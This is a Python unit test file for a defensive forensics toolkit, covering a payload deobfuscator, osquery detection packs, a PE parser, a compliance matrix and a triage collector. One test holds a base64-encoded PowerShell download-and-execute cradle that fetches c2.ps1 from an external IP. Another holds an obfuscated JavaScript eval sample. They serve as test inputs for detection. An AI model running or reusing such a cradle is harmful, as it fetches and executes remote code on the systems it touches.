"""Unit tests for expanded tooling: deobfuscator, osquery, PE metadata, compliance, and triage."""

import os
import struct
import tempfile
import unittest
from cyber.analyzers.deobfuscator import PayloadDeobfuscator
from cyber.parsers.pe_metadata_parser import PeMetadataParser
from cyber.rules.osquery_engine import OsqueryEngine
from cyber.core.compliance import ComplianceMatrixGenerator
from cyber.core.hashing import register_evidence
from cyber.triage.collector import TriageCollector

class TestExtensions(unittest.TestCase):
    def test_deobfuscator_powershell(self):
        # Base64 for "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.44/c2.ps1')"
        raw_b64 = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANAAvAGMAMgAuAHAAcwAxACcAKQA="
        cmd = f"powershell.exe -enc {raw_b64}"
        res = PayloadDeobfuscator.deobfuscate(cmd)
        self.assertTrue(res["layers_removed"] >= 1)
        self.assertIn("185.220.101.44", res["extracted_ips"])
        self.assertTrue(any("DownloadString" in c for c in res["extracted_commands"]))

    def test_deobfuscator_charcode(self):
        js = "eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))"
        res = PayloadDeobfuscator.deobfuscate(js)
        self.assertTrue(res["layers_removed"] >= 1)
        self.assertIn("alert(1)", res["clean_output"])

    def test_osquery_packs(self):
        packs = OsqueryEngine.get_all_packs()
        self.assertTrue(len(packs) >= 5)
        linux_packs = OsqueryEngine.get_queries_by_platform("linux")
        self.assertTrue(any("ld.so.preload" in q["query"] for q in linux_packs))
        mitre_matches = OsqueryEngine.get_query_by_mitre("T1574.006")
        self.assertEqual(len(mitre_matches), 1)

    def test_pe_metadata_parser(self):
        # Create a synthetic minimal PE header file (128 bytes)
        with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as f:
            dos_header = b"MZ" + b"\x00" * 58 + struct.pack("<I", 64)
            pe_header = b"PE\x00\x00" + struct.pack("<HHI", 0x8664, 3, 1700000000) + b"\x00" * 60
            f.write(dos_header + pe_header)
            pe_path = f.name
        try:
            parser = PeMetadataParser()
            artifacts = parser.parse_file(pe_path)
            self.assertEqual(len(artifacts), 1)
            self.assertTrue(artifacts[0].normalized_data["is_pe_format"])
            self.assertEqual(artifacts[0].normalized_data["machine_type"], "x64 (AMD64)")
        finally:
            if os.path.exists(pe_path):
                os.unlink(pe_path)

    def test_compliance_matrix(self):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"COMPLIANCE_TEST_EVIDENCE")
            p = f.name
        try:
            ev = register_evidence(p, description="Test compliance sample")
            matrix = ComplianceMatrixGenerator.evaluate([ev])
            self.assertEqual(matrix["overall_status"], "COMPLIANT")
            self.assertEqual(matrix["total_evidence_count"], 1)
        finally:
            if os.path.exists(p):
                os.unlink(p)

    def test_triage_collector(self):
        with tempfile.TemporaryDirectory() as out_dir:
            collector = TriageCollector(output_dir=out_dir)
            res = collector.collect()
            self.assertTrue(os.path.exists(res["archive_path"]))
            self.assertEqual(len(res["sha256"]), 64)
            self.assertTrue(res["artifacts_count"] >= 3)

if __name__ == "__main__":
    unittest.main()
